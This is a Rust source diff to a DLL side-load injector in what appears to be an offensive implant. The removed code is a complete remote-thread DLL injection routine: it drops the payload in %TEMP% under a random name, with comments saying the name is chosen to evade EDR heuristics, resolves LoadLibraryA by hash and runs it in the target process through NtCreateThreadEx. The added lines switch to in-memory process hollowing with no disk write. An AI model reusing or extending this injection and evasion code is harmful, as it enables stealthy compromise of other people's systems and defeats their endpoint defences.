@@ -30,8 +30,6 @@ impl Injector for DllSideLoadInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
         use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
         use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
-        use winapi::um::synchapi::WaitForSingleObject;
-        use winapi::um::winbase::INFINITE;
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
         use winapi::um::winnt::{
             PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
@@ -200,129 +198,12 @@ impl Injector for DllSideLoadInjector {
             return Ok(());
         }
 
-        // ── 4. PE path: write payload DLL to temp path ──────────────────
-        // Use %TEMP% with a random UUID-based name.
-        //
-        // The old name (dxgi-{pid}.dll) was predictable (PID is small and
-        // known to EDR) and used a suspicious DX prefix that triggers name-
-        // based heuristics.  A random UUID name is statistically unique per
-        // injection, provides no PID information, and does not match any
-        // known suspicious prefix list.
-        let tmp = std::env::temp_dir();
-        let dll_name = format!(
-            "{}\\{}.dll",
-            tmp.display(),
-            uuid::Uuid::new_v4().simple()
-        );
-        let dll_name_c = std::ffi::CString::new(dll_name.as_str()).map_err(|_| {
-            unsafe { pe_resolve::close_handle(h_proc) };
-            anyhow!("DLL path has interior NUL")
-        })?;
-
-        std::fs::write(&dll_name, payload).map_err(|e| {
-            unsafe { pe_resolve::close_handle(h_proc) };
-            anyhow!("failed to write sideload DLL to {dll_name}: {e}")
-        })?;
-
-        let cleanup = || {
-            let _ = std::fs::remove_file(&dll_name);
-        };
-
-        // Resolve LoadLibraryA for the PE-on-disk path.
-        let kernel32_base = unsafe {
-            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"KERNEL32.DLL\0"))
-        }
-        .ok_or_else(|| {
-            cleanup();
-            unsafe { pe_resolve::close_handle(h_proc) };
-            anyhow!("kernel32 not found")
-        })?;
-
-        let loadlib_addr = unsafe {
-            pe_resolve::get_proc_address_by_hash(
-                kernel32_base,
-                pe_resolve::hash_str(b"LoadLibraryA\0"),
-            )
-        }
-        .ok_or_else(|| {
-            cleanup();
-            unsafe { pe_resolve::close_handle(h_proc) };
-            anyhow!("LoadLibraryA not found")
-        })?;
-
-        // ── 5. Write DLL path string into the remote process ────────────
-        let path_bytes = dll_name_c.as_bytes_with_nul();
-        let remote_path = unsafe {
-            VirtualAllocEx(
-                h_proc,
-                std::ptr::null_mut(),
-                path_bytes.len(),
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
-            )
-        };
-        if remote_path.is_null() {
-            cleanup();
-            unsafe { pe_resolve::close_handle(h_proc) };
-            return Err(anyhow!("DllSideLoad: VirtualAllocEx for path failed"));
-        }
-        let mut written = 0usize;
-        unsafe {
-            WriteProcessMemory(
-                h_proc,
-                remote_path,
-                path_bytes.as_ptr() as _,
-                path_bytes.len(),
-                &mut written,
-            );
-        }
-
-        // ── 6. Create remote thread: LoadLibraryA(path) ─────────────────
-        let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
-        let status = unsafe {
-            nt_create_thread(
-                &mut h_thread,
-                0x1FFFFF,
-                std::ptr::null_mut(),
-                h_proc,
-                loadlib_addr as *mut _,
-                remote_path,
-                0,
-                0,
-                0,
-                0,
-                std::ptr::null_mut(),
-            )
-        };
-        if status < 0 || h_thread.is_null() {
-            cleanup();
-            unsafe {
-                winapi::um::memoryapi::VirtualFreeEx(
-                    h_proc,
-                    remote_path,
-                    0,
-                    winapi::um::winnt::MEM_RELEASE,
-                );
-                pe_resolve::close_handle(h_proc);
-            }
-            return Err(anyhow!("DllSideLoad: NtCreateThreadEx failed: {status:#x}"));
-        }
-
-        // Wait for LoadLibraryA to complete, then clean up.
-        unsafe {
-            WaitForSingleObject(h_thread, INFINITE);
-            pe_resolve::close_handle(h_thread);
-            winapi::um::memoryapi::VirtualFreeEx(
-                h_proc,
-                remote_path,
-                0,
-                winapi::um::winnt::MEM_RELEASE,
-            );
-            pe_resolve::close_handle(h_proc);
-        }
-        cleanup();
-
-        tracing::info!(pid, dll_name, "DllSideLoad: injected via LoadLibraryA");
+        // ── 4. PE path: in-memory injection via hollowing (no disk write) ──
+        // Close our process handle; hollowing::inject_into_process opens its own.
+        unsafe { pe_resolve::close_handle(h_proc) };
+        hollowing::inject_into_process(pid, payload)
+            .map_err(|e| anyhow!("DllSideLoad: in-memory PE injection failed: {e}"))?;
+        tracing::info!(pid, "DllSideLoad: PE injected in-memory (no disk write)");
         Ok(())
     }
 }
